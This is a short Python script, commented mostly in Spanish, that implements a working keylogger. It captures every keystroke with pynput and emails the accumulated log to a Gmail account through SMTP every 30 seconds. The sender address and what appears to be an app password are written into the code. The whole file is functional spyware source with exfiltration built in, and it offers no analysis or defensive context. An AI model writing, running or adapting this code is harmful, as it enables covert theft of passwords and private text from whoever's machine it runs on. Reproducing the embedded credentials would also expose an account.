#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText
from pynput.keyboard import Key, Listener
import threading

class Keylogger:
    
    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True
    
    def pressed_key(self, key):  # Esta función modifica la variable global log manejando errores
        try:
            # Asigna a log las teclas alfanuméricas
            self.log += str(key.char)
        except AttributeError:
            # Mediante un diccionario de teclas especiales, asignamos a log las teclas especiales
            special_keys = {key.space: " ", key.backspace: " Backspace", key.enter: " Enter ", key.shift: " Shift ", key.ctrl: " Ctrl ", key.alt: " Alt "}

            self.log += special_keys.get(key, f" {str(key)} ")

        print(self.log)  # Muestra el log en la consola para depuración

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)   # Creating msg object using MIMEText class of email module
        msg['Subject'] = subject  # Assigning the subject
        msg['From'] = sender  # Assigning the sender email address
        msg['To'] = ', '.join(recipients)  # Assigning recepients email address.

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:   # Creating connection using context manager
           smtp_server.login(sender, password)
           smtp_server.sendmail(sender, recipients, msg.as_string())
        print(f"[+]Email sent Successfully!")

    def report(self):  # Esta función se llama de manera recursiva cada 5 seg para limpiar el log
        # Aquí podrías escribir el log a un archivo en lugar de borrarlo, si quieres conservarlo
        email_body = "[+] El keylogger se ha iniciado exitosamente" if self.is_first_run else self.log
        self.send_email("Keylogger Report", email_body, "juancastro4850@gmail.com", ["juancastro4850@gmail.com"], "mitq opwb xiwf nlva")
        self.log = ""

        if self.is_first_run:
            self.is_first_run = False

        if not self.request_shutdown:
        # Configura el timer para que la función se ejecute de nuevo después de 5 segundos
            self.timer = threading.Timer(30, self.report)
            self.timer.start()

    def shutdown(self):
        self.request_shutdown = True
        if self.timer:
            self.timer.cancel()

    
    def start(self):
        # Iniciar el listener del teclado
        keyboard_listener = Listener(on_press=self.pressed_key)
        
        with keyboard_listener:
            self.report()  # Inicia el reporte recursivo
            keyboard_listener.join()

# Ejecutar el keylogger
if __name__ == "__main__":
    my_keylogger = Keylogger()
    my_keylogger.start()

